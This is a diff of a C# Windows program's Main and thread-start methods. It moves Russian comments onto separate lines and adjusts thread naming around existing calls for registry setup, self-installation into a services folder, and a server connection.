@@ -3,6 +3,7 @@ using System.Threading;
 using System.Windows.Forms;
 using Timer = System.Threading.Timer;
 
+
 namespace NaNiT
 {
     class Program
@@ -14,25 +15,31 @@ namespace NaNiT
 
         static void Main()
         {
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Functions.FirstRunOptionsLoad();                                /// Первоначальная настройка. Загрузка из реестра и прописывание некоторых параметров
-            Functions.AutoSelfInstall(false);                               /// Копирование себя в папку сервисов, запуск оттуда удаление лишнего           
-            CFunc.Chat();                                                   /// Старт соединения с сервером
+            // Первоначальная настройка. Загрузка из реестра и прописывание некоторых параметров
+            Functions.FirstRunOptionsLoad();
 
+            // Копирование себя в папку сервисов, запуск оттуда удаление лишнего
+            Functions.AutoSelfInstall(false);
+
+            // Старт соединения с сервером
+            CFunc.Chat();
+
+            // Старт таймеров и тредов
             Timer UpdateTimer = new Timer(Upd, null, 0, 3000000);
             Thread ServStates = new Thread(new ThreadStart(TempServRun));
-            ServStates.Name = "Server sender and reopener";
             ServStates.Start();
 
+            //
             Application.Run();
         }
 
 
         public static void CheckServiceUpdate(object obj)
         {
-            Thread t2 = Thread.CurrentThread;
-            t2.Name = "Update Timer";
+            Thread MyThread = Thread.CurrentThread;
+            if (MyThread.Name == null)
+                MyThread.Name = "Update Timer";
+
             ServiceWork.CheckUpdServer();
             ServiceWork.ServiceInit();
             Thread.Sleep(5000);
@@ -46,6 +53,9 @@ namespace NaNiT
 
         public static void TempServRun()
         {
+            Thread ServRun = Thread.CurrentThread;
+            if (ServRun.Name == null)
+                ServRun.Name = "Server sender and reopener";
             do
             {
                 while (!Globals.serverIsConnected)
